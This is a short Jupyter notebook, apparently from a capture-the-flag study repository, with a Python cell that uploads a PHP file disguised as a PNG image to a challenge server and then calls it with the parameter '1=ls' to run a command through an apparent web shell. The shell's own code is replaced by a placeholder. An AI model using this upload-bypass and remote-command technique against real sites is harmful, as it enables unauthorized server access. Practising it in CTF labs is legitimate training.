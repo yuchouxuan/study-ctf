{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "16a7ad7c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://122.114.225.243:20122'\n",
    "user_ini = b'''FOX----FOX'''\n",
    "dat = {'file': ('fox.php', user_ini,'image/png')}\n",
    "import requests\n",
    "requests.post(url,files=dat,data={'submit':'Upload'}).text\n",
    "requests.post(url+'/upload/fox.php?1=ls').text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.8 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8 (main, Oct 13 2022, 10:17:43) [Clang 14.0.0 (clang-1400.0.29.102)]"
  },
  "vscode": {
   "interpreter": {
    "hash": "b460384b52104c1e5b9cf54bee46a255d22b2bef338f75ac4ad5d48196028d3c"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
